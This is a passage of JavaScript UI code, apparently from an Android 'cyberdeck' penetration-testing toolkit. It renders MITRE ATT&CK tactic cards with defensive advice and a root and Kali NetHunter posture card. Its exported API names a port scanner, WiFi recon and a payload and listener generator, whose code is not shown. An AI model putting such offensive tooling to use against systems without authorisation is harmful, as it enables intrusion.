                <div id="${cardId}_mitre_detail" style="background:#090d1a; border:1px solid #1e293b; border-radius:4px; padding:10px; font-family:monospace; font-size:11px;">
                    <div style="color:#00f0ff; font-weight:700; font-size:12px; margin-bottom:4px;">RECONNAISSANCE</div>
                    <div style="color:#cbd5e1; margin-bottom:6px;">Adversary attempts to gather information for planning future operations.</div>
                    <div style="color:#ffb700; margin-bottom:4px;">Primary Techniques: <span style="color:#fff;">T1595 Active Scanning // T1592 Host Information</span></div>
                    <div style="color:#00ff88;">Defense & Hardening: <span style="color:#94a3b8;">Monitor boundary telemetry, rate-limit scans</span></div>
                </div>
            </div>
        `;

        c.appendChild(card);
        c.scrollTop = c.scrollHeight;
        if (window.HoloBridge && window.HoloBridge.vibrate) HoloBridge.vibrate(20);
        return cardId;
    }

    function showMitreDetails(cardId, tacticId) {
        const detailEl = document.getElementById(`${cardId}_mitre_detail`);
        const tabs = document.getElementById(`${cardId}_mitre_tabs`);
        if (!detailEl) return;

        if (tabs) {
            tabs.querySelectorAll('.mitre-tactic-btn').forEach(b => {
                b.classList.toggle('active', b.textContent.toLowerCase().includes(tacticId));
            });
        }

        const MAP = {
            recon: { title: 'RECONNAISSANCE', desc: 'Adversary gathers intelligence to plan future targeted operations.', tech: 'T1595 Active Scanning // T1592 Gather Victim Host Info', def: 'Rate limit edge probes, monitor threat feeds, obfuscate internal topology' },
            init: { title: 'INITIAL ACCESS', desc: 'Adversary gains an initial foothold on the network or device.', tech: 'T1190 Exploit Public App // T1566 Phishing // T1091 Removable Media', def: 'Patch known CVEs, deploy WAF, MFA on all external services' },
            exec: { title: 'EXECUTION', desc: 'Adversary runs malicious code on victim hosts.', tech: 'T1059 Command & Script Interpreter // T1204 User Execution', def: 'Script block logging, SELinux enforcement, restrict execution in /tmp' },
            priv: { title: 'PRIVILEGE ESCALATION', desc: 'Adversary attempts to obtain higher-level permissions (e.g. UID 0 / SYSTEM).', tech: 'T1548 Abuse Elevation Control // T1068 Exploitation', def: 'Verify SUID binaries, restrict sudoers, apply kernel patches' },
            def: { title: 'DEFENSE EVASION', desc: 'Adversary attempts to avoid detection by security controls.', tech: 'T1070 Indicator Removal // T1027 Obfuscated Files // T1036 Masquerading', def: 'Ship logs off-box in real-time, enforce file integrity monitoring' },
            cred: { title: 'CREDENTIAL ACCESS', desc: 'Adversary steals accounts, hashes, and session tokens.', tech: 'T1003 OS Credential Dumping // T1110 Brute Force // T1552 Unsecured Credentials', def: 'Credential Guard, salt password databases, restrict /etc/shadow access' },
            c2: { title: 'COMMAND & CONTROL', desc: 'Adversary communicates with systems under their control within the network.', tech: 'T1071 Application Layer Protocol // T1573 Encrypted Channel', def: 'Inspect egress traffic, detect anomalous DNS queries, block unauthorized ports' }
        };

        const item = MAP[tacticId] || MAP.recon;
        detailEl.innerHTML = `
            <div style="color:#00f0ff; font-weight:700; font-size:12px; margin-bottom:4px;">${item.title}</div>
            <div style="color:#cbd5e1; margin-bottom:6px;">${item.desc}</div>
            <div style="color:#ffb700; margin-bottom:4px;">Primary Techniques: <span style="color:#fff;">${item.tech}</span></div>
            <div style="color:#00ff88;">Defense & Hardening: <span style="color:#94a3b8;">${item.def}</span></div>
        `;
    }

    /**
     * Spawns Security Posture & Device Hardening Audit Card
     */
    function spawnSecurityPostureCard(customPosture) {
        const c = getContainer();
        if (!c) return;

        cardCount++;
        const cardId = 'task_posture_' + cardCount;
        const card = document.createElement('div');
        card.className = 'spatial-task-card cyber-card';
        card.id = cardId;

        let posture = customPosture;
        if (!posture && window.HoloBridge && window.HoloBridge.getDeviceSecurityPosture) {
            try {
                posture = JSON.parse(window.HoloBridge.getDeviceSecurityPosture());
            } catch (e) {}
        }
        if (!posture) {
            posture = {
                isRooted: true,
                androidVersion: "14.0",
                sdkVersion: 34,
                deviceModel: "Android Cyberdeck Termux",
                kernelVersion: "Linux 5.15.137 aarch64",
                isNetHunterBridgeActive: true
            };
        }

        card.innerHTML = `
            <div class="spatial-card-header">
                <div class="spatial-card-title">
                    <span>🛡️ DEVICE SECURITY POSTURE & AUDIT</span>
                    <span style="opacity:0.8; font-size:10px;">// SYSTEM INTEGRITY</span>
                </div>
                <button class="spatial-close-btn" onclick="SpatialTasks.dismiss('${cardId}')">✕</button>
            </div>
            <div class="spatial-card-body">
                <div style="display:flex; justify-content:space-between; padding:5px 0; border-bottom:1px dashed #1e293b;">
                    <span style="color:#94a3b8;">Root Privileges (UID 0 / SU):</span>
                    <span style="color:${posture.isRooted ? '#00ff88' : '#ef4444'}; font-weight:700;">${posture.isRooted ? 'ACTIVE (UID 0)' : 'UNPRIVILEGED'}</span>
                </div>
                <div style="display:flex; justify-content:space-between; padding:5px 0; border-bottom:1px dashed #1e293b;">
                    <span style="color:#94a3b8;">Kali NetHunter Daemon:</span>
                    <span style="color:${posture.isNetHunterBridgeActive ? '#00ff88' : '#ffb700'}; font-weight:700;">${posture.isNetHunterBridgeActive ? 'ONLINE (127.0.0.1:8765)' : 'STANDBY'}</span>
                </div>
                <div style="display:flex; justify-content:space-between; padding:5px 0; border-bottom:1px dashed #1e293b;">
                    <span style="color:#94a3b8;">Kernel & Architecture:</span>
                    <span style="color:#38bdf8;">${escapeHtml(posture.kernelVersion || 'Linux aarch64')}</span>
                </div>
                <div style="display:flex; justify-content:space-between; padding:5px 0; border-bottom:1px dashed #1e293b;">
                    <span style="color:#94a3b8;">Android OS & API Level:</span>
                    <span style="color:#ffffff;">Android ${escapeHtml(String(posture.androidVersion))} (API ${posture.sdkVersion})</span>
                </div>
                <div style="display:flex; justify-content:space-between; padding:5px 0; border-bottom:1px dashed #1e293b;">
                    <span style="color:#94a3b8;">Hardware Identification:</span>
                    <span style="color:#ffffff;">${escapeHtml(posture.deviceModel || 'Cyberdeck')}</span>
                </div>
                <div style="margin-top:10px; background:#04060b; border:1px solid #1e293b; border-radius:4px; padding:8px; font-family:monospace; font-size:10px;">
                    <div style="color:#00ff88; font-weight:700; margin-bottom:2px;">AUDIT SUMMARY:</div>
                    <div style="color:#cbd5e1;">Environment possesses root access inside Kali NetHunter PRoot. Ideal for network auditing, raw socket binding, and packet generation.</div>
                </div>
            </div>
        `;

        c.appendChild(card);
        c.scrollTop = c.scrollHeight;
        if (window.HoloBridge && window.HoloBridge.vibrate) HoloBridge.vibrate(20);
        return cardId;
    }

    return {
        spawnTerminalCard: spawnTerminalCard,
        spawnToolCard: spawnToolCard,
        spawnTelemetryCard: spawnTelemetryCard,
        spawnPortScannerCard: spawnPortScannerCard,
        executePortScan: executePortScan,
        spawnPayloadGeneratorCard: spawnPayloadGeneratorCard,
        selectPayloadType: selectPayloadType,
        updatePayloadCode: updatePayloadCode,
        copyPayload: copyPayload,
        copyListener: copyListener,
        spawnHashAnalyzerCard: spawnHashAnalyzerCard,
        analyzeCryptoInput: analyzeCryptoInput,
        cryptoConvert: cryptoConvert,
        spawnWifiReconCard: spawnWifiReconCard,
        refreshWifiScan: refreshWifiScan,
        spawnMitreAttackCard: spawnMitreAttackCard,
        showMitreDetails: showMitreDetails,
        spawnSecurityPostureCard: spawnSecurityPostureCard,
        dismiss: dismiss,
        clearAll: clearAll
    };
})();
